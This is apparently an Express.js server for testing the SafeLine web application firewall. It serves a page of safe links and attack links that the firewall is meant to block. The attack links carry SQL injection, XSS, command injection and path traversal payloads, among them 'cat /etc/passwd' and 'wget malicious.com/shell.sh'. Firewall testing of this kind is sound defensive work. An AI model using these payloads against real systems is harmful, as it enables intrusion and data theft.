const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Home page with attack tests
app.get('/', (req, res) => {
  const host = req.get('host');
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SafeLine WAF Test Website</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px;
            text-align: center;
            border-radius: 20px 20px 0 0;
        }
        .content { padding: 40px; }
        .section {
            background: #f9f9f9;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
        }
        h2 { color: #667eea; margin-bottom: 20px; }
        .test-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        .test-card {
            background: white;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            padding: 20px;
            transition: all 0.3s;
        }
        .test-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        .test-link {
            display: block;
            padding: 12px 24px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            text-align: center;
            margin-top: 10px;
        }
        .safe { background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%); }
        .status {
            display: inline-block;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: 600;
            margin-top: 10px;
        }
        .status-safe { background: #d4edda; color: #155724; }
        .status-blocked { background: #f8d7da; color: #721c24; }
        .info-box {
            background: #f0f7ff;
            border-left: 4px solid #667eea;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 30px;
        }
        code {
            background: #f5f5f5;
            padding: 2px 8px;
            border-radius: 4px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ SafeLine WAF Test Website</h1>
            <p>Test your Web Application Firewall</p>
            <p style="margin-top: 10px; opacity: 0.9;">URL: ${host}</p>
        </div>
        
        <div class="content">
            <div class="info-box">
                <h3>📋 How This Works:</h3>
                <ul style="margin-left: 20px; line-height: 2;">
                    <li><strong>Without WAF:</strong> All links work (even attacks)</li>
                    <li><strong>With SafeLine:</strong> Attacks return <code>403 Forbidden</code></li>
                    <li><strong>Check:</strong> SafeLine dashboard shows blocked attacks</li>
                </ul>
            </div>
            
            <div class="section">
                <h2>✅ Safe Requests (Should Always Work)</h2>
                <div class="test-grid">
                    <div class="test-card">
                        <h3>Homepage</h3>
                        <p>Normal request</p>
                        <a href="/" class="test-link safe">Test</a>
                        <span class="status status-safe">200 OK</span>
                    </div>
                    <div class="test-card">
                        <h3>API Call</h3>
                        <p>Legitimate endpoint</p>
                        <a href="/api/users" class="test-link safe">Test</a>
                        <span class="status status-safe">200 OK</span>
                    </div>
                    <div class="test-card">
                        <h3>Search</h3>
                        <p>Normal query</p>
                        <a href="/search?q=hello" class="test-link safe">Test</a>
                        <span class="status status-safe">200 OK</span>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2>🚫 SQL Injection (Should Be Blocked)</h2>
                <div class="test-grid">
                    <div class="test-card">
                        <h3>OR-based SQLi</h3>
                        <p>Classic injection</p>
                        <a href="/?id=1' OR '1'='1" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                    <div class="test-card">
                        <h3>UNION SQLi</h3>
                        <p>Union-based attack</p>
                        <a href="/?id=1 UNION SELECT NULL--" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                    <div class="test-card">
                        <h3>Boolean SQLi</h3>
                        <p>Boolean injection</p>
                        <a href="/?id=1 AND 1=1--" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2>🚫 XSS Attacks (Should Be Blocked)</h2>
                <div class="test-grid">
                    <div class="test-card">
                        <h3>Script Tag</h3>
                        <p>Basic XSS</p>
                        <a href="/?q=<script>alert(1)</script>" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                    <div class="test-card">
                        <h3>IMG XSS</h3>
                        <p>Image-based XSS</p>
                        <a href="/?name=<img src=x onerror=alert(1)>" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                    <div class="test-card">
                        <h3>Event Handler</h3>
                        <p>Event-based XSS</p>
                        <a href="/?data=<body onload=alert(1)>" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2>🚫 Command Injection (Should Be Blocked)</h2>
                <div class="test-grid">
                    <div class="test-card">
                        <h3>Shell Command</h3>
                        <p>Execute bash</p>
                        <a href="/?cmd=/bin/bash" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                    <div class="test-card">
                        <h3>Command Chain</h3>
                        <p>Chained commands</p>
                        <a href="/?exec=ls;cat /etc/passwd" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                    <div class="test-card">
                        <h3>RCE Attempt</h3>
                        <p>Remote code execution</p>
                        <a href="/?run=wget malicious.com/shell.sh" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2>🚫 Path Traversal (Should Be Blocked)</h2>
                <div class="test-grid">
                    <div class="test-card">
                        <h3>File Access</h3>
                        <p>Read system files</p>
                        <a href="/?file=../../../../etc/passwd" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                    <div class="test-card">
                        <h3>Windows Path</h3>
                        <p>Windows traversal</p>
                        <a href="/?path=..\\..\\..\\windows\\system32" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                    <div class="test-card">
                        <h3>Encoded Path</h3>
                        <p>URL-encoded attack</p>
                        <a href="/?file=%2e%2e%2fetc%2fpasswd" class="test-link">Attack</a>
                        <span class="status status-blocked">403 Forbidden</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
  `);
});

// API endpoint
app.get('/api/users', (req, res) => {
  res.json({
    success: true,
    message: 'API endpoint working',
    users: [
      { id: 1, name: 'John Doe' },
      { id: 2, name: 'Jane Smith' }
    ]
  });
});

// Search endpoint
app.get('/search', (req, res) => {
  const query = req.query.q || '';
  res.json({
    success: true,
    query: query,
    results: []
  });
});

// Catch-all for attack tests
app.get('*', (req, res) => {
  res.json({
    message: 'Request received',
    path: req.path,
    query: req.query
  });
});

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`🌐 Test at: http://localhost:${PORT}`);
});